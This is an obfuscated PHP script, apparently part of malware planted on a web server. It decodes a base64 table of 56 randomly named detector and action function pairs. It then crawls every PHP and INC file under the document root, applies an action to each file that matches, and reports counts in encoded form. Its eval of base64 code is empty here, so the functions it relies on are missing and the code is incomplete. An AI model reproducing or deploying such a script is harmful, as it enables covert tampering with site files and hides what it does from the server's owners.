eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo1Njp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czo3OiJyeXlwa2V4IjtpOjI7czo0OiJncWJuIjt9aToxO2E6Mzp7aTowO2k6NTtpOjE7czo1OiJyb2d1YSI7aToyO3M6NjoiZ3B6bWZqIjt9aToyO2E6Mzp7aTowO2k6MTU7aToxO3M6NDoicnRvYiI7aToyO3M6NToiZ2Zqc2kiO31pOjM7YTozOntpOjA7aToxODtpOjE7czo0OiJyeWpuIjtpOjI7czo0OiJnem95Ijt9aTo0O2E6Mzp7aTowO2k6MjM7aToxO3M6Njoicm9id3VrIjtpOjI7czo2OiJnZnl3ZGkiO31pOjU7YTozOntpOjA7aTozNDtpOjE7czoxMDoicmV1aXdmcm56biI7aToyO3M6MTE6ImdsdnR1eWprY2VwIjt9aTo2O2E6Mzp7aTowO2k6MzY7aToxO3M6OToicnFlYXpqZXRmIjtpOjI7czo4OiJnbG9ldGhkZiI7fWk6NzthOjM6e2k6MDtpOjQyO2k6MTtzOjQ6InJkdWwiO2k6MjtzOjg6ImdwaWthcWxjIjt9aTo4O2E6Mzp7aTowO2k6NTQ7aToxO3M6Njoicnl0a3J4IjtpOjI7czo4OiJnZWFocXFldCI7fWk6OTthOjM6e2k6MDtpOjYwO2k6MTtzOjEwOiJya3hoZ3JxeWFsIjtpOjI7czo3OiJnbXprbm10Ijt9aToxMDthOjM6e2k6MDtpOjY5O2k6MTtzOjQ6InJlZmciO2k6MjtzOjU6ImdkaG5lIjt9aToxMTthOjM6e2k6MDtpOjc5O2k6MTtzOjk6InJkamZhc3hyZyI7aToyO3M6NToiZ3FmdXUiO31pOjEyO2E6Mzp7aTowO2k6ODk7aToxO3M6NDoicmhvdyI7aToyO3M6MTA6Imd6Zmt5bHlvc2kiO31pOjEzO2E6Mzp7aTowO2k6OTA7aToxO3M6MTA6InJxY3hqZmhkcnAiO2k6MjtzOjExOiJnZ2d3cWxhZm1hbCI7fWk6MTQ7YTozOntpOjA7aTo5NTtpOjE7czoxMDoicnJoend5YXhzYyI7aToyO3M6MTA6Imd6dHp6c2xrZWkiO31pOjE1O2E6Mzp7aTowO2k6MTA5O2k6MTtzOjk6InJ3d3BzbXJtZyI7aToyO3M6OToiZ3J5cnRoemZhIjt9aToxNjthOjM6e2k6MDtpOjExMDtpOjE7czoxMDoicm96ZGFjdHlldCI7aToyO3M6NjoiZ25zZWtzIjt9aToxNzthOjM6e2k6MDtpOjExMTtpOjE7czoxMDoicnJieGV1cHNreSI7aToyO3M6MTA6ImdxaXBvcW9iYWwiO31pOjE4O2E6Mzp7aTowO2k6MTEyO2k6MTtzOjc6InJhYWlocmMiO2k6MjtzOjg6ImdxendydHRuIjt9aToxOTthOjM6e2k6MDtpOjExNTtpOjE7czo1OiJyc2dneiI7aToyO3M6MTA6Imd6dHRiZWVlZ3oiO31pOjIwO2E6Mzp7aTowO2k6MTE2O2k6MTtzOjc6InJ3YXB1ZnQiO2k6MjtzOjg6ImdxeHhtcG5lIjt9aToyMTthOjM6e2k6MDtpOjExODtpOjE7czo5OiJybmlyeHd2aHkiO2k6MjtzOjU6ImdsZW16Ijt9aToyMjthOjM6e2k6MDtpOjExOTtpOjE7czo5OiJyeHBkbnlzd2IiO2k6MjtzOjExOiJna3VjcnBmbG9pYSI7fWk6MjM7YTozOntpOjA7aToxMjM7aToxO3M6MTE6InJrYWN3YWdoaWxmIjtpOjI7czo2OiJnYXlyemMiO31pOjI0O2E6Mzp7aTowO2k6MTI1O2k6MTtzOjY6InJxanF2ciI7aToyO3M6NToiZ2VjZGciO31pOjI1O2E6Mzp7aTowO2k6MTI2O2k6MTtzOjEwOiJyeHVibW9pZHRkIjtpOjI7czoxMDoiZ3JseHZtbGtpdiI7fWk6MjY7YTozOntpOjA7aToxMjc7aToxO3M6OToicnFtY2t3ZnRmIjtpOjI7czoxMToiZ2Z3d3ppc3RxZnMiO31pOjI3O2E6Mzp7aTowO2k6MTI4O2k6MTtzOjY6InJyZHBmdSI7aToyO3M6NjoiZ3RxZWVmIjt9aToyODthOjM6e2k6MDtpOjEzMDtpOjE7czo1OiJyanBtaCI7aToyO3M6OToiZ2p5c3VjZnZzIjt9aToyOTthOjM6e2k6MDtpOjEzNDtpOjE7czo0OiJyb2FvIjtpOjI7czoxMDoiZ3ZyaGZqaGRrcCI7fWk6MzA7YTozOntpOjA7aToxMzc7aToxO3M6NjoicnB6ZGZ0IjtpOjI7czo5OiJnb3hva25td20iO31pOjMxO2E6Mzp7aTowO2k6MTM4O2k6MTtzOjY6InJwdXdhbyI7aToyO3M6OToiZ3FlbG1tYWJyIjt9aTozMjthOjM6e2k6MDtpOjE0NjtpOjE7czo1OiJyZGxmZSI7aToyO3M6NzoiZ3VsZ3BmZSI7fWk6MzM7YTozOntpOjA7aToxNDg7aToxO3M6NDoicmd5cSI7aToyO3M6MTA6Imd1aGN3eWp1cXgiO31pOjM0O2E6Mzp7aTowO2k6MTUzO2k6MTtzOjg6InJjaWVkbW1rIjtpOjI7czoxMToiZ2xjbGNmYXNpbG0iO31pOjM1O2E6Mzp7aTowO2k6MTU2O2k6MTtzOjU6InJicnhzIjtpOjI7czo0OiJnb3FwIjt9aTozNjthOjM6e2k6MDtpOjE1NztpOjE7czo0OiJybWF4IjtpOjI7czoxMToiZ2V3dml4cGp6dnoiO31pOjM3O2E6Mzp7aTowO2k6MTU4O2k6MTtzOjU6InJicGZjIjtpOjI7czo0OiJnd2FiIjt9aTozODthOjM6e2k6MDtpOjE2MDtpOjE7czo3OiJyaXN1emdmIjtpOjI7czo3OiJnb2xiY3VtIjt9aTozOTthOjM6e2k6MDtpOjE2MztpOjE7czoxMDoicnFoYmNqZG1zdiI7aToyO3M6MTE6Imdlc3N0eHN1aXBtIjt9aTo0MDthOjM6e2k6MDtpOjE2NjtpOjE7czo1OiJya3F5cSI7aToyO3M6NjoiZ2lpY2tvIjt9aTo0MTthOjM6e2k6MDtpOjE2ODtpOjE7czo4OiJybmVpc2lzeiI7aToyO3M6MTE6ImdiYWZldmlvdmhiIjt9aTo0MjthOjM6e2k6MDtpOjE3MjtpOjE7czo1OiJya3FzZiI7aToyO3M6ODoiZ3ZmemF6cGsiO31pOjQzO2E6Mzp7aTowO2k6MTc0O2k6MTtzOjU6InJmeXhqIjtpOjI7czoxMDoiZ3lvYmVqZnNzZCI7fWk6NDQ7YTozOntpOjA7aToxNzc7aToxO3M6ODoicnpidnRna2ciO2k6MjtzOjExOiJnd2RwZ2RvZG5zbSI7fWk6NDU7YTozOntpOjA7aToxNzk7aToxO3M6ODoicmVmdm5iZGQiO2k6MjtzOjc6ImdvZnRqZWkiO31pOjQ2O2E6Mzp7aTowO2k6MTgyO2k6MTtzOjU6InJ4ZW9uIjtpOjI7czoxMDoiZ3Fxc3FtdW16dyI7fWk6NDc7YTozOntpOjA7aToxODc7aToxO3M6NzoicmJ5aHVjciI7aToyO3M6ODoiZ2JwdmZ4aWMiO31pOjQ4O2E6Mzp7aTowO2k6MTg4O2k6MTtzOjExOiJyaWxyZnl0c3ZraCI7aToyO3M6NToiZ3B2cHkiO31pOjQ5O2E6Mzp7aTowO2k6MTg5O2k6MTtzOjg6InJtbmh0ZXJwIjtpOjI7czo0OiJnY3VrIjt9aTo1MDthOjM6e2k6MDtpOjE5MDtpOjE7czoxMToicm5nbXV1ZXVubGMiO2k6MjtzOjU6ImdpdGdsIjt9aTo1MTthOjM6e2k6MDtpOjE5MTtpOjE7czo4OiJybHZqbXRyZiI7aToyO3M6MTA6ImdrdHBvZHJqbWsiO31pOjUyO2E6Mzp7aTowO2k6MTkyO2k6MTtzOjg6InJlanB4dWVyIjtpOjI7czo0OiJncW12Ijt9aTo1MzthOjM6e2k6MDtpOjE5NDtpOjE7czo1OiJydW5qYSI7aToyO3M6NjoiZ3B6aGxyIjt9aTo1NDthOjM6e2k6MDtpOjE5NjtpOjE7czoxMDoicnpqdnVuZHF1biI7aToyO3M6NjoiZ2VtZ2h1Ijt9aTo1NTthOjM6e2k6MDtpOjE5ODtpOjE7czo3OiJycHFqbWd1IjtpOjI7czo1OiJnaWhlZyI7fX0="));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();